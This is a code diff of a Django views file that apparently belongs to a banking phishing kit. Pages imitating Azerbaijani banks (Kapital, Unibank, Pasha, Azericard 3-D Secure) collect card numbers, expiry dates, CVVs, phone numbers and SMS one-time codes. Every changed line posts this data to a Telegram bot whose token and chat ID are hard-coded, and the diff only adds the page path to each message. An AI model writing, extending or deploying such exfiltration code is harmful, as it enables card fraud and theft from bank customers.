@@ -120,7 +120,7 @@ def info(request):
         contact.cvv = cvv_
         contact.bankname=""
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}')
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\n\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}')
         context = {
                 'id':contact.id,
                 "display":contact.hidden_type
@@ -389,7 +389,7 @@ def dsecazericard(request):
         "display":contact.hidden_type
 
     }
-    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nsms:{contact.sms}|number{contact.phone}')
+    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}')
 
     return render( request,'pages/loading.html',context )
 
@@ -417,7 +417,7 @@ def dseckapital(request):
         contact.sms=concatenated
         contact.bankname=""
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nnumber{contact.phone}\nsms:{concatenated}')
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nnumber{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html' )
     
     return render( request,'pages/loading.html',context )
@@ -469,7 +469,7 @@ def unibank3d(request):
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
         return render(request, 'pages/unibank3d.html')
-    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{contact.id}\nsms:{contact.sms}|number{contact.phone}')
+    response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}')
     return render( request,'pages/loading.html',context )
 
 
@@ -525,7 +525,7 @@ def pashabank3d(request):
         contact.sms=concatenated
         contact.bankname=""
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nnumber{contact.phone}\nsms:{concatenated}')
+        response = requests.post(f'https://api.telegram.org/bot6292006544:AAEvqnhp_PfGBPU9H5765fAI-7r_v39qcSo/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\n Number{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html',context )
     
     return render( request,'pages/loading.html',context )
